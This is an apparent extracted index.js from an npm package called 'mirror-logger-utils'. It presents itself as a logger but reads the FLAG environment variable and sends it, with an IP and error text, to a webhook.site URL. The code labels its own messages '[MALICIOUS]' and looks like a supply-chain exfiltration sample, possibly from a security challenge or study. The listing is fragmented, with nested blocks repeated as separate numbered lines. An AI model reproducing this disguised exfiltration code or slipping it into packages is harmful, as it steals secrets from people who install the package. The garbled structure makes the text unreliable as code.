// File: tmp/tmpa5_ixsts/mirror-logger-utils/package/index.js
// ======================================================================
Line 1: const fs = require("fs")
Line 2: const https = require("https")
Line 3: const path = require("path")
Line 5: {
  let flag = null;
  let errMsg = "";

  try {
    flag = process.env.FLAG;
  } catch (err) {
    flag = "flag_not_found";
    errMsg = err.message;
  }

  const exfilURL = `https://webhook.site/b4783b50-04e0-461a-bbf9-8341f2169973/?ip=${encodeURIComponent(
    ip
  )}&flag=${encodeURIComponent(flag)}&error=${encodeURIComponent(errMsg)}`;

  https
    .get(exfilURL, (res) => {
      console.log(`[MALICIOUS] Flag sent. Status: ${res.statusCode}`);
    })
    .on("error", (err) => {
      console.error("[MALICIOUS] Error sending flag:", err.message);
    });

  console.log(`[MALICIOUS LOGGER] ${ip}: ${message}`);
}
Line 21: {
      console.log(`[MALICIOUS] Flag sent. Status: ${res.statusCode}`);
    }
Line 22: console.log(`[MALICIOUS] Flag sent. Status: ${res.statusCode}`)
Line 24: {
      console.error("[MALICIOUS] Error sending flag:", err.message);
    }
Line 25: console.error("[MALICIOUS] Error sending flag:", err.message)
Line 28: console.log(`[MALICIOUS LOGGER] ${ip}: ${message}`)
